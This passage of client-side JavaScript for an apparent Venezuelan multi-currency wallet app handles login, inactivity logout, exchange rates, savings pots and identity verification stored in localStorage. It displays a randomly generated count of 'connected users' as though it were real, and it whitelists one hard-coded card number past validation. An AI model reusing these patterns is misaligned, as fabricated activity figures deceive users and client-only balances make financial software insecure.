            const forcedEur = parseFloat(forcedOption.dataset.eur || '');
            selectedAmount.usd = forcedUsd;
            selectedAmount.bs = Number.isFinite(forcedBs) ? forcedBs : Math.round(forcedUsd * CONFIG.EXCHANGE_RATES.USD_TO_BS);
            selectedAmount.eur = Number.isFinite(forcedEur) ? forcedEur : forcedUsd * CONFIG.EXCHANGE_RATES.USD_TO_EUR;
          }
        }
      }

      if (typeof updateSubmitButtonsState === 'function') {
        updateSubmitButtonsState();
      }
      if (typeof updateVerificationAmountDisplays === 'function') {
        updateVerificationAmountDisplays();
      }
    }

    if (typeof document !== 'undefined' && typeof document.addEventListener === 'function') {
      document.addEventListener('forcedValidationAmountChanged', applyForcedValidationAmount);
    }
    if (typeof window !== 'undefined' && typeof window.addEventListener === 'function') {
      window.addEventListener('forcedValidationAmountChanged', applyForcedValidationAmount);
    }

    // Funcin para actualizar los displays de tasa de cambio
    function updateExchangeRateDisplays() {
      // Actualizar el display principal en la tarjeta de saldo
      const exchangeRateDisplay = document.getElementById('exchange-rate-display');
      if (exchangeRateDisplay) {
        exchangeRateDisplay.textContent = `Tasa: 1 USD = ${CONFIG.EXCHANGE_RATES.USD_TO_BS.toFixed(2)} Bs | 1 USD = ${CONFIG.EXCHANGE_RATES.USD_TO_EUR.toFixed(2)} EUR`;
      }
      
      // Actualizar displays en los mtodos de pago
      const cardExchangeRateDisplay = document.getElementById('card-exchange-rate-display');
      const bankExchangeRateDisplay = document.getElementById('bank-exchange-rate-display');
      const mobileExchangeRateDisplay = document.getElementById('mobile-exchange-rate-display');
      
      const rateText = `1 USD = ${CONFIG.EXCHANGE_RATES.USD_TO_BS.toFixed(2)} Bs | 1 USD = ${CONFIG.EXCHANGE_RATES.USD_TO_EUR.toFixed(2)} EUR`;
      
      if (cardExchangeRateDisplay) cardExchangeRateDisplay.textContent = rateText;
      if (bankExchangeRateDisplay) bankExchangeRateDisplay.textContent = rateText;
      if (mobileExchangeRateDisplay) mobileExchangeRateDisplay.textContent = rateText;
    }

    // Funcin para actualizar los equivalentes de balance
    function updateBalanceEquivalents() {
      const usdEquivalent = document.getElementById('usd-equivalent');
      const eurEquivalent = document.getElementById('eur-equivalent');
      
      if (usdEquivalent) {
        usdEquivalent.textContent = ` ${formatCurrency(currentUser.balance.usd, 'usd')}`;
      }
      
      if (eurEquivalent) {
        eurEquivalent.textContent = ` ${formatCurrency(currentUser.balance.eur, 'eur')}`;
      }
    }

    // Inicializacin de la aplicacin
    function initApp() {
      // Generar o recuperar ID de dispositivo
      currentUser.deviceId = generateDeviceId();
      
      // Set current date
      updateDateDisplay();
      setInterval(updateDateDisplay, 60000);
      
      // Random users count
      updateOnlineUsersCount();
      setInterval(updateOnlineUsersCount, 60000); // Actualizar cada minuto
      
      // Inicializa los displays de tasa de cambio
      updateExchangeRateDisplays();
      
      // Cargar credenciales guardadas si existen
      loadUserCredentials();

      const hasSession = loadSessionData();
      if (hasSession) {
        loadBalanceData();
        loadTransactionsData();
        loadVerificationStatus();
        loadCardData();
        loadSavingsData();
        loadExchangeHistory();
        loadFirstRechargeStatus();
        loadWelcomeBonusStatus();
        loadMobilePaymentData();
        updateUserUI();
        updateSavingsUI();
        const loginContainer = document.getElementById('login-container');
        if (loginContainer) loginContainer.style.display = 'none';
        const appHeader = document.getElementById('app-header');
        if (appHeader) appHeader.style.display = 'flex';
        const dashboardContainer = document.getElementById('dashboard-container');
        if (dashboardContainer) dashboardContainer.style.display = 'block';
        const bottomNav = document.getElementById('bottom-nav');
        if (bottomNav) bottomNav.style.display = 'flex';
        checkBannersVisibility();
        showWelcomeBonusIfEligible();
        updatePendingTransactionsBadge();
        updateRejectedTransactionsBadge();
        resetInactivityTimer();
        return;
      }

      // Check if balance data exists (el nico dato que se mantiene)
      if (loadBalanceData()) {
        // Requerir login - el balance est guardado, pero necesita iniciar sesin
        showLoginForm();
      } else {
        // No hay datos guardados - mostrar login
        showLoginForm();
      }

      loadSavingsData();
      loadExchangeHistory();
      updateSavingsUI();
      
      // Cargar estado de verificacin
      loadVerificationStatus();
      
      // Cargar datos de pago mvil si existen
      loadMobilePaymentData();

      // Actualizar enlaces de WhatsApp con datos actuales
      updateWhatsAppLinks();

      updateVerificationButtons();
    }

    // Cargar credenciales del usuario desde localStorage
    function loadUserCredentials() {
      const savedCredentials = localStorage.getItem(CONFIG.STORAGE_KEYS.USER_CREDENTIALS);
      let credentials = null;
      if (savedCredentials) {
        try {
          credentials = JSON.parse(savedCredentials);
        } catch (e) {
          console.error('Error parsing user credentials:', e);
        }
      }

      if (!credentials) {
        const regData = localStorage.getItem('visaUserData');
        if (regData) {
          try {
            const parsed = JSON.parse(regData);
            credentials = {
              name: (parsed.preferredName || `${parsed.firstName || ''} ${parsed.lastName || ''}`).trim(),
              email: parsed.email || ''
            };
          } catch (e) {
            console.error('Error parsing registration data:', e);
          }
        }
      }

      if (credentials) {
        const nameInput = document.getElementById('full-name');
        const emailInput = document.getElementById('email');
        const loginSubtitle = document.getElementById('login-subtitle');

        if (nameInput && credentials.name) {
          nameInput.value = credentials.name;
        }

        if (emailInput && credentials.email) {
          emailInput.value = credentials.email;
        }

        if (loginSubtitle && (credentials.name || credentials.email)) {
          loginSubtitle.textContent = "Bienvenido de nuevo, ingrese su clave para continuar";
        }

        return true;
      }
      return false;
    }

    // Guardar credenciales del usuario en localStorage
    function saveUserCredentials(name, email) {
      localStorage.setItem(CONFIG.STORAGE_KEYS.USER_CREDENTIALS, JSON.stringify({
        name: name,
        email: email
      }));
    }

    // Actualizar contador de usuarios en lnea
    function updateOnlineUsersCount() {
      const min = 98;
      const max = 142;
      activeUsersCount = Math.floor(Math.random() * (max - min + 1)) + min;
      
      const userCountElement = document.getElementById('users-online-count');
      if (userCountElement) {
        userCountElement.textContent = `${activeUsersCount} usuarios conectados`;
      }
    }

    // Configurar manejador de inactividad
    function setupInactivityHandler() {
      // Lista de eventos que reinician el temporizador de inactividad
      const events = ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'];
      
      // Aadir listeners para cada evento
      events.forEach(event => {
        document.addEventListener(event, resetInactivityTimer);
      });
      
      // Configurar timer inicial
      resetInactivityTimer();
    }

    // Resetear temporizador de inactividad
    function resetInactivityTimer() {
      // Limpiar temporizador anterior
      if (inactivityTimer) clearTimeout(inactivityTimer);
      if (inactivityCountdown) clearInterval(inactivityCountdown);
      
      // Ocultar modal de advertencia si est visible
      const inactivityModal = document.getElementById('inactivity-modal');
      if (inactivityModal) inactivityModal.style.display = 'none';
      
      // Si no hay sesin activa, no configurar temporizador
      if (!isLoggedIn()) return;
      
      // Configurar nuevo temporizador para mostrar la advertencia
      inactivityTimer = setTimeout(() => {
        showInactivityWarning();
      }, CONFIG.INACTIVITY_TIMEOUT - CONFIG.INACTIVITY_WARNING);
    }

    // Mostrar advertencia de inactividad
    function showInactivityWarning() {
      const inactivityModal = document.getElementById('inactivity-modal');
      const inactivityTimerEl = document.getElementById('inactivity-timer');
      
      if (inactivityModal && inactivityTimerEl) {
        // Mostrar modal
        inactivityModal.style.display = 'flex';
        
        // Reiniciar contador
        inactivitySeconds = 30;
        inactivityTimerEl.textContent = inactivitySeconds;
        
        // Iniciar cuenta regresiva
        inactivityCountdown = setInterval(() => {
          inactivitySeconds--;
          inactivityTimerEl.textContent = inactivitySeconds;
          if (inactivitySeconds <= 0) {
            // Tiempo expirado - cerrar sesin
            clearInterval(inactivityCountdown);
            logout();
          }
        }, 1000);
      }
    }

    // Funcin para validar tarjetas usando algoritmo de Luhn
    function validateCardNumber(cardNumber) {
      // Quitar espacios y guiones
      cardNumber = cardNumber.replace(/\D/g, '');
      
      if (!/^\d+$/.test(cardNumber)) return false;
      if (cardNumber.length < 13 || cardNumber.length > 19) return false;
      
      // Verificar si es la tarjeta vlida especfica
      if (cardNumber === CONFIG.VALID_CARD) {
        return true;
      }
      
      // Si no es la tarjeta especfica, aplicar algoritmo de Luhn
      let sum = 0;
      let double = false;
      
      // Recorrer el nmero de derecha a izquierda
      for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i));
        
        if (double) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        
        sum += digit;
        double = !double;
      }
      
      return (sum % 10) === 0;
    }

    // Funcin para validar nmero de cdula venezolana
    function validateIdNumber(idNumber) {
      // Formato: V12345678 o E12345678
      const regex = /^[VE]\d{7,8}$/;
      return regex.test(idNumber);
    }

    // Funcin para validar nmero de telfono venezolano
    function validatePhoneNumber(phoneNumber) {
      // Formato: 04121234567 (sin espacios ni guiones)
      const regex = /^(0412|0414|0416|0424|0426)\d{7}$/;
      return regex.test(phoneNumber);
    }

    // Verificar si el usuario est logueado
    function isLoggedIn() {
      return sessionStorage.getItem('remeexSession') === 'active';
    }

    // Verificar si una caracterstica est bloqueada
    function isFeatureBlocked() {
      return verificationStatus.status !== 'verified';
    }

    // Mostrar formulario de login
    function showLoginForm() {
      document.getElementById('login-container').style.display = 'flex';
      document.getElementById('app-header').style.display = 'none';
      document.getElementById('dashboard-container').style.display = 'none';
      document.getElementById('bottom-nav').style.display = 'none';
      document.getElementById('recharge-container').style.display = 'none';
      displayPreLoginBalance();
      personalizeLogin();
    }

    // Funcin para actualizar datos de pago mvil en la interfaz
    function updateMobilePaymentInfo() {
      // Mostrar los datos del usuario en lugar de datos fijos
      const nameValue = document.getElementById('mobile-payment-name-value');
      const rifValue = document.getElementById('mobile-payment-rif-value');
      const phoneValue = document.getElementById('mobile-payment-phone-value');

      const bankNameEl1 = document.getElementById('user-bank-name');
      const bankNameEl2 = document.getElementById('user-bank-name-2');
      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
      const bankName = BANK_NAME_MAP[reg.primaryBank] || '';
      if (bankNameEl1) bankNameEl1.textContent = bankName;
      if (bankNameEl2) bankNameEl2.textContent = bankName;
      
      const nameCopyBtn = document.querySelector('#mobile-payment-name .copy-btn');
      const rifCopyBtn = document.querySelector('#mobile-payment-rif .copy-btn');
      const phoneCopyBtn = document.querySelector('#mobile-payment-phone .copy-btn');
      
      // Establecer el nombre completo del usuario como titular
      const regData = JSON.parse(localStorage.getItem('visaUserData') || '{}');
      const fullName =
        currentUser.fullName ||
        regData.fullName ||
        `${regData.firstName || ''} ${regData.lastName || ''}`.trim();
      if (nameValue && fullName) {
        nameValue.textContent = fullName;
        if (nameCopyBtn) {
          nameCopyBtn.setAttribute('data-copy', fullName);
        }
      }
      
      if (verificationStatus.status === 'verified' || verificationStatus.status === 'pending') {
        // Si est verificado o en proceso, mostrar los datos del usuario
        
        // Mostrar la cdula del usuario en lugar de RIF fijo
        if (rifValue && verificationStatus.idNumber) {
          rifValue.textContent = verificationStatus.idNumber;
          if (rifCopyBtn) {
            rifCopyBtn.setAttribute('data-copy', verificationStatus.idNumber);
          }
        }
        
        // Mostrar el telfono del usuario en lugar de telfono fijo
        if (phoneValue && verificationStatus.phoneNumber) {
          // Dar formato al nmero de telfono: 0412-1234567
          const formattedPhone = verificationStatus.phoneNumber.replace(/(\d{4})(\d{7})/, '$1-$2');
          phoneValue.textContent = formattedPhone;
          if (phoneCopyBtn) {
            phoneCopyBtn.setAttribute('data-copy', formattedPhone);
          }
        }
        
        // Mostrar el mensaje de confirmacin y la nota informativa si los datos estn completos
        const mobilePaymentSuccess = document.getElementById('mobile-payment-success');
        const mobilePaymentNote = document.getElementById('mobile-payment-note');
        if (verificationStatus.idNumber && verificationStatus.phoneNumber) {
          if (mobilePaymentSuccess) {
            mobilePaymentSuccess.style.display = 'flex';
          }
          if (mobilePaymentNote) {
            mobilePaymentNote.style.display = 'block';
          }
        } else {
          if (mobilePaymentSuccess) {
            mobilePaymentSuccess.style.display = 'none';
          }
          if (mobilePaymentNote) {
            mobilePaymentNote.style.display = 'none';
          }
        }
      }
      
      // Guardar datos de pago mvil en localStorage para persistencia
      saveMobilePaymentData();
    }

    // Funcin para escapar caracteres especiales (sanitizar entradas)
    function escapeHTML(str) {
      return str
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
    }

    // Helper functions
    function formatCurrency(amount, currency) {
      if (currency === 'usd') {
        return '$' + amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
      } else if (currency === 'bs') {
        return 'Bs ' + amount.toLocaleString('es-VE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
      } else if (currency === 'eur') {
        return '' + amount.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
      }
    }

    function getCurrentDate() {
      const date = new Date();
      const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
      return date.toLocaleDateString('es-ES', options);
    }

    function getCurrentDateTime() {
      const date = new Date();
      const dateOptions = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
      const timeOptions = { hour: 'numeric', minute: '2-digit', hour12: true };
      const dateStr = date.toLocaleDateString('es-ES', dateOptions);
      const timeStr = date.toLocaleTimeString('es-ES', timeOptions).toLowerCase();
      return `${dateStr} ${timeStr}`;
    }

    function getUserCity() {
      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
      return (reg.state || '').toLowerCase();
    }

    function getCityValidationAmount(tier, fallback) {
      const city = getUserCity();
      if (CITY_VALIDATION_AMOUNTS[city] && CITY_VALIDATION_AMOUNTS[city][tier]) {
        return CITY_VALIDATION_AMOUNTS[city][tier];
      }
      return fallback;
    }

    function capitalize(text) {
      return text ? text.charAt(0).toUpperCase() + text.slice(1) : '';
    }

    function getShortDate() {
      const date = new Date();
      const options = { month: 'long', day: 'numeric', year: 'numeric' };
      return date.toLocaleDateString('es-ES', options);
    }

    function getCurrentTime() {
      const now = new Date();
      return now.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' });
    }

    // Funciones de almacenamiento compartido
    function saveUserData() {
      localStorage.setItem(CONFIG.STORAGE_KEYS.USER_DATA, JSON.stringify({
        name: currentUser.name,
        fullName: currentUser.fullName,
        email: currentUser.email,
        deviceId: currentUser.deviceId, // Guardar el ID del dispositivo
        idNumber: currentUser.idNumber, // Guardar nmero de cdula
        phoneNumber: currentUser.phoneNumber // Guardar nmero de telfono
      }));
    }

    function saveBalanceData() {
      // Incluir el ID del dispositivo para garantizar que solo se pueda ver el saldo desde este dispositivo
      localStorage.setItem(CONFIG.STORAGE_KEYS.BALANCE, JSON.stringify({
        ...currentUser.balance,
        deviceId: currentUser.deviceId
      }));
    }

    function loadBalanceData() {
      const savedBalance = localStorage.getItem(CONFIG.STORAGE_KEYS.BALANCE);
      if (savedBalance) {
        try {
          const balanceData = JSON.parse(savedBalance);
          
          // Verificar si este es el dispositivo correcto
          if (balanceData.deviceId && balanceData.deviceId === currentUser.deviceId) {
            // Extraer solo el balance sin el deviceId
            currentUser.balance = {
              usd: balanceData.usd || 0,
              bs: balanceData.bs || 0,
              eur: balanceData.eur || 0
            };
            return true;
          } else {
            // Si es otro dispositivo, no cargar el balance
            return false;
          }
        } catch (e) {
          console.error('Error parsing balance data:', e);
          return false;
        }
      }
      return false;
    }

    function saveSavingsData() {
      localStorage.setItem(CONFIG.STORAGE_KEYS.SAVINGS, JSON.stringify({
        pots: savings.pots,
        nextId: savings.nextId,
        deviceId: currentUser.deviceId
      }));
    }

    function loadSavingsData() {
      const saved = localStorage.getItem(CONFIG.STORAGE_KEYS.SAVINGS);
      if (saved) {
        try {
          const data = JSON.parse(saved);
          if (data.deviceId && data.deviceId === currentUser.deviceId) {
            savings.pots = (data.pots || []).map(p => ({
              id: p.id,
              name: p.name,
              balance: p.balance || 0,
              goal: p.goal || 0
            }));
            savings.nextId = data.nextId || 1;
            return true;
          }
        } catch(e) { console.error('Error parsing savings data:', e); }
      }
      return false;
    }

   function createSavingsPot(name, goal = 0) {
     const pot = { id: savings.nextId++, name: name, balance: 0, goal: goal };
     savings.pots.push(pot);
     saveSavingsData();
     updateSavingsUI();
      addNotification('success', 'Ahorros', `Bote "${escapeHTML(name)}" creado`);
     return true;
   }

    function saveExchangeHistory() {
      localStorage.setItem('remeexExchangeHistory', JSON.stringify(exchangeHistory));
    }

    function loadExchangeHistory() {
      const data = localStorage.getItem('remeexExchangeHistory');
      if (data) {
        try { exchangeHistory = JSON.parse(data); } catch(e) { exchangeHistory = []; }
      }
    }

    function renderExchangeHistory() {
      const container = document.getElementById('exchange-history');
      if (!container) return;
      container.innerHTML = '';
      if (!exchangeHistory.length) {
        container.innerHTML = '<div class="no-history">Sin operaciones recientes</div>';
        return;
      }
      exchangeHistory.slice(-5).reverse().forEach(h => {
        const div = document.createElement('div');
        div.className = 'history-item';
        const typeText = h.type === 'send' ? 'Enviado' : 'Recibido';
        const curr = h.currency || 'usd';
        const note = h.note ? ` <em>${escapeHTML(h.note)}</em>` : '';
        div.innerHTML = `<strong>${typeText}</strong> ${formatCurrency(h.amount,curr)} - ${escapeHTML(h.email)}${note} <div class="history-date">${h.date}</div>`;
        container.appendChild(div);
      });
    }

    function updateExchangeBalances() {
      const usdEl = document.getElementById('bal-usd');
      const bsEl = document.getElementById('bal-bs');
      const eurEl = document.getElementById('bal-eur');
      if (usdEl) usdEl.textContent = formatCurrency(currentUser.balance.usd, 'usd');
      if (bsEl) bsEl.textContent = formatCurrency(currentUser.balance.bs, 'bs');
      if (eurEl) eurEl.textContent = formatCurrency(currentUser.balance.eur, 'eur');
    }

   function depositToPot(id, amount) {
     const pot = savings.pots.find(p => p.id === id);
     if (!pot || amount > currentUser.balance.usd) return false;
     pot.balance += amount;
     currentUser.balance.usd -= amount;
      currentUser.balance.bs -= amount * CONFIG.EXCHANGE_RATES.USD_TO_BS;
      currentUser.balance.eur -= amount * CONFIG.EXCHANGE_RATES.USD_TO_EUR;
      saveBalanceData();
      saveSavingsData();
      updateDashboardUI();
      updateSavingsUI();
      addTransaction({
        type: 'withdraw',
        amount: amount,
        amountBs: amount * CONFIG.EXCHANGE_RATES.USD_TO_BS,
        amountEur: amount * CONFIG.EXCHANGE_RATES.USD_TO_EUR,
        date: getCurrentDateTime(),
        description: `Transferido a ${escapeHTML(pot.name)}`,
        status: 'completed'
      });
      addNotification('success', 'Ahorros', `Depositaste ${formatCurrency(amount,'usd')} en ${escapeHTML(pot.name)}`);
      return true;
    }

   function withdrawFromPot(id, amount) {
     const pot = savings.pots.find(p => p.id === id);
     if (!pot || amount > pot.balance) return false;
     pot.balance -= amount;
     currentUser.balance.usd += amount;
      currentUser.balance.bs += amount * CONFIG.EXCHANGE_RATES.USD_TO_BS;
      currentUser.balance.eur += amount * CONFIG.EXCHANGE_RATES.USD_TO_EUR;
      saveBalanceData();
      saveSavingsData();
      updateDashboardUI();
      updateSavingsUI();
      addTransaction({
        type: 'deposit',
        amount: amount,
        amountBs: amount * CONFIG.EXCHANGE_RATES.USD_TO_BS,
        amountEur: amount * CONFIG.EXCHANGE_RATES.USD_TO_EUR,
        date: getCurrentDateTime(),
        description: `Retiro de ${escapeHTML(pot.name)}`,
        status: 'completed'
      });
      addNotification('success', 'Ahorros', `Retiraste ${formatCurrency(amount,'usd')} de ${escapeHTML(pot.name)}`);
      return true;
    }

   function transferBetweenPots(fromId, toId, amount) {
     const from = savings.pots.find(p => p.id === fromId);
     const to = savings.pots.find(p => p.id === toId);
     if (!from || !to || fromId === toId || amount > from.balance) return false;
     from.balance -= amount;
     to.balance += amount;
     saveSavingsData();
     updateSavingsUI();
      addNotification('success', 'Ahorros', `Transferiste ${formatCurrency(amount,'usd')} de ${escapeHTML(from.name)} a ${escapeHTML(to.name)}`);
     return true;
   }

   function deleteSavingsPot(id) {
     const idx = savings.pots.findIndex(p => p.id === id);
     if (idx === -1 || savings.pots[idx].balance !== 0) return false;
      const name = savings.pots[idx].name;
      savings.pots.splice(idx, 1);
      saveSavingsData();
      updateSavingsUI();
      addNotification('info', 'Ahorros', `Bote "${escapeHTML(name)}" eliminado`);
      return true;
   }

    function updateSavingsButton() {
      const container = document.getElementById('balance-savings');
      const btn = document.getElementById('view-savings-btn');
      if (!container || !btn) return;
      if (!savings.pots.length) {
        container.style.display = 'none';
        return;
      }
      const withBal = savings.pots.filter(p => p.balance > 0);
      if (withBal.length === 1) {
        btn.textContent = `Ver mi saldo en ${withBal[0].name}`;
      } else {
        btn.textContent = 'Ver mi saldo en mis botes';
      }
      container.style.display = 'block';
    }

    function updateSavingsSummary() {
      const totalEl = document.getElementById('summary-total');
      const countEl = document.getElementById('summary-count');
      if (!totalEl || !countEl) return;
      const total = savings.pots.reduce((sum, p) => sum + p.balance, 0);
      totalEl.textContent = formatCurrency(total, 'usd');
      countEl.textContent = savings.pots.length;
    }

    function updateSavingsVerificationBanner() {
      const banner = document.getElementById('savings-verify-banner');
      if (!banner) return;
      if (verificationStatus.status === 'verified') {
        banner.style.display = 'none';
        } else if (verificationStatus.status === 'pending' || verificationStatus.status === 'processing' || verificationStatus.status === 'bank_validation' || verificationStatus.status === 'payment_validation') {
        banner.textContent = 'Verificacin en proceso. Algunas funciones pueden estar limitadas.';
        banner.style.display = 'block';
      } else {
        banner.textContent = 'Debes verificar tu identidad para habilitar todas las funciones de Ahorros.';
        banner.style.display = 'block';
      }
    }

    function updateSavingsUI() {
      updateSavingsButton();
      updateSavingsSummary();
      updateSavingsVerificationBanner();
      const list = document.getElementById('savings-list');
      if (!list) return;
      list.innerHTML = '';
      savings.pots.forEach(pot => {
        const div = document.createElement('div');
        div.className = 'savings-pot';
        const progress = pot.goal ? (pot.balance / pot.goal * 100).toFixed(0) : 0;
        div.innerHTML = `<div><strong>${escapeHTML(pot.name)}</strong><br>`+
          `${formatCurrency(pot.balance,'usd')} / ${formatCurrency(pot.goal,'usd')}`+
          `<div class="pot-progress"><div class="pot-progress-bar" style="width:${progress}%"></div></div></div>`+
          `<div class="savings-actions">`+
          `<button class="btn btn-outline" data-action="deposit" data-id="${pot.id}">Depositar</button>`+
          `<button class="btn btn-outline" data-action="withdraw" data-id="${pot.id}">Retirar</button>`+
          `${savings.pots.length>1?`<button class="btn btn-outline" data-action="transfer" data-id="${pot.id}">Transferir</button>`:''}`+
          `${pot.balance===0?`<button class="btn btn-outline" data-action="delete" data-id="${pot.id}">Eliminar</button>`:''}`+
          `</div>`;
        list.appendChild(div);
      });
      list.querySelectorAll('button').forEach(btn => {
        const id = parseInt(btn.getAttribute('data-id'));
        const action = btn.getAttribute('data-action');
        btn.addEventListener('click', () => {
          openSavingsActionModal(action, id);
        });
      });
    }

    let savingsModalAction = null;
    let savingsModalPotId = null;

    function openSavingsActionModal(action, potId) {
      savingsModalAction = action;
      savingsModalPotId = potId || null;
      const modal = document.getElementById('savings-action-modal');
      const title = document.getElementById('savings-modal-title');
      const body = document.getElementById('savings-modal-body');
      const confirm = document.getElementById('savings-modal-confirm');

      body.innerHTML = '';
      if (action === 'create') {
        title.textContent = 'Nuevo Bote de Ahorro';
        confirm.textContent = 'Crear';
        body.innerHTML = `
          <div class="form-group" id="savings-name-group">
            <label class="form-label" for="savings-name">Nombre</label>
            <input type="text" class="form-control" id="savings-name">
          </div>
          <div class="form-group">
            <label class="form-label" for="savings-goal">Meta (USD)</label>
            <input type="number" class="form-control" id="savings-goal" min="0" value="0">
          </div>`;
      } else {
        const pot = savings.pots.find(p => p.id === potId) || { name: '', balance: 0 };
        if (action === 'delete') {
          title.textContent = `Eliminar ${pot.name}`;
          confirm.textContent = 'Eliminar';
          body.innerHTML = '<p>Seguro que desea eliminar este bote?</p>';
        } else {
          title.textContent = action === 'deposit' ? `Depositar en ${pot.name}` :
                            action === 'withdraw' ? `Retirar de ${pot.name}` :
                            `Transferir desde ${pot.name}`;
          confirm.textContent = action === 'withdraw' ? 'Retirar' :
                                action === 'deposit' ? 'Depositar' : 'Transferir';
          body.innerHTML = `
            <div class="form-group">
              <label class="form-label" for="savings-amount">Monto (USD)</label>
              <input type="number" class="form-control" id="savings-amount" min="1">
            </div>`;
          if (action === 'withdraw') {
            body.innerHTML += `
              <div class="form-group small-text">Saldo actual: <span id="savings-current-balance">${formatCurrency(pot.balance,'usd')}</span></div>
              <div class="form-group small-text">Saldo restante: <span id="savings-remaining">${formatCurrency(pot.balance,'usd')}</span></div>
              <button class="btn btn-outline btn-small" id="savings-withdraw-all-btn">Retirar todo</button>`;
          }
          if (action === 'transfer') {
            const options = savings.pots.filter(p => p.id !== potId)
              .map(p => `<option value="${p.id}">${escapeHTML(p.name)}</option>`)
              .join('');
            body.innerHTML += `
              <div class="form-group">
                <label class="form-label" for="savings-destination">Bote destino</label>
                <select id="savings-destination" class="form-control">${options}</select>
              </div>`;
          }
        }
      }
      modal.style.display = 'flex';
      if (action === 'withdraw') {
        const input = document.getElementById('savings-amount');
        const remain = document.getElementById('savings-remaining');
        const withdrawAllBtn = document.getElementById('savings-withdraw-all-btn');
        const current = pot.balance;
        const updateRemain = () => {
          const val = parseFloat(input.value) || 0;
          const after = current - val;
          remain.textContent = formatCurrency(after < 0 ? 0 : after, 'usd');
        };
        if (input) input.addEventListener('input', updateRemain);
        if (withdrawAllBtn) withdrawAllBtn.addEventListener('click', function() {
          input.value = current;
          updateRemain();
        });
        updateRemain();
      }
    }

    function closeSavingsActionModal() {
      const modal = document.getElementById('savings-action-modal');
      modal.style.display = 'none';
    }

    function confirmSavingsAction() {
      let success = false;
      if (savingsModalAction === 'create') {
        const name = document.getElementById('savings-name').value.trim();
        const goal = parseFloat(document.getElementById('savings-goal').value) || 0;
        if (name) success = createSavingsPot(name, goal);
      } else if (savingsModalAction === 'deposit') {
        const amount = parseFloat(document.getElementById('savings-amount').value);
        if (!isNaN(amount) && amount > 0) success = depositToPot(savingsModalPotId, amount);
      } else if (savingsModalAction === 'withdraw') {
        const amount = parseFloat(document.getElementById('savings-amount').value);
        if (!isNaN(amount) && amount > 0) success = withdrawFromPot(savingsModalPotId, amount);
      } else if (savingsModalAction === 'transfer') {
        const amount = parseFloat(document.getElementById('savings-amount').value);
        const destId = parseInt(document.getElementById('savings-destination').value);
        if (!isNaN(amount) && amount > 0) success = transferBetweenPots(savingsModalPotId, destId, amount);
      } else if (savingsModalAction === 'delete') {
        success = deleteSavingsPot(savingsModalPotId);
      }
      closeSavingsActionModal();
      if (!success) {
        showToast('error', 'Ahorros', 'No se pudo completar la operacin');
      }
    }

    // Guardar datos de verificacin
    function saveVerificationData() {
      localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_DATA, JSON.stringify({
        idNumber: verificationStatus.idNumber,
        phoneNumber: verificationStatus.phoneNumber,
        status: verificationStatus.status
      }));
    }

    // Cargar datos de verificacin
    function loadVerificationData() {
      const data = localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_DATA);
      if (!data) return false;
      try {
        const verificationData = JSON.parse(data);

        const idNumber = verificationData.idNumber || verificationData.documentNumber || '';
        if (idNumber) {
          verificationStatus.idNumber = idNumber;
          if (!currentUser.idNumber) currentUser.idNumber = idNumber;
        }

        if (verificationData.phoneNumber) {
          verificationStatus.phoneNumber = verificationData.phoneNumber;
          if (!currentUser.phoneNumber) currentUser.phoneNumber = verificationData.phoneNumber;
        }

        if (verificationData['full-name'] && !currentUser.fullName) {
          currentUser.fullName = verificationData['full-name'];
        }

        return true;
      } catch (e) {
        console.error('Error parsing verification data:', e);
        return false;
      }
    }

    function saveVerificationStatus() {
      localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION, verificationStatus.status);
      // Tambin guardar los datos adicionales
      saveVerificationData();
    }

    function loadVerificationStatus() {
      const status = localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION);
      if (status) {
        verificationStatus.status = status;
        
        if (status === 'verified') {
          verificationStatus.isVerified = true;
          verificationStatus.hasUploadedId = true;
        } else if (status === 'pending' || status === 'processing' || status === 'bank_validation' || status === 'payment_validation') {
          verificationStatus.isVerified = false;
          verificationStatus.hasUploadedId = true;
        } else {
          verificationStatus.isVerified = false;
          verificationStatus.hasUploadedId = false;
        }
        
        // Cargar tambin los datos adicionales de verificacin
        loadVerificationData();
        
        return true;
      }
      return false;
    }

    function saveTransactionsData() {
      // Incluir el ID del dispositivo para garantizar que solo se puedan ver las transacciones desde este dispositivo
      localStorage.setItem(CONFIG.STORAGE_KEYS.TRANSACTIONS, JSON.stringify({
        transactions: currentUser.transactions,
        deviceId: currentUser.deviceId
      }));
    }

    function loadTransactionsData() {
      const savedTransactionsData = localStorage.getItem(CONFIG.STORAGE_KEYS.TRANSACTIONS);
      if (savedTransactionsData) {
        try {
          const data = JSON.parse(savedTransactionsData);
          
          // Verificar si este es el dispositivo correcto
          if (data.deviceId && data.deviceId === currentUser.deviceId) {
            currentUser.transactions = data.transactions || [];
            // Identificar transacciones pendientes
            pendingTransactions = currentUser.transactions.filter(t => t.status === 'pending' && t.description === 'Pago Mvil');
            return true;
          } else {
            // Si es otro dispositivo, no cargar las transacciones
            return false;
          }
        } catch (e) {
          console.error('Error parsing transactions data:', e);
          return false;
        }
      }
      return false;
    }

    function saveCardData() {
      localStorage.setItem(CONFIG.STORAGE_KEYS.CARD_DATA, JSON.stringify({
        hasSavedCard: currentUser.hasSavedCard,
        cardRecharges: currentUser.cardRecharges,
        deviceId: currentUser.deviceId // Incluir ID del dispositivo
      }));
    }

    function loadCardData() {
      const savedCardData = localStorage.getItem(CONFIG.STORAGE_KEYS.CARD_DATA);
      if (savedCardData) {
        try {
          const cardData = JSON.parse(savedCardData);
          
          // Verificar si este es el dispositivo correcto
          if (cardData.deviceId && cardData.deviceId === currentUser.deviceId) {
            currentUser.hasSavedCard = cardData.hasSavedCard;
            currentUser.cardRecharges = cardData.cardRecharges || 0;
            return true;
          } else {
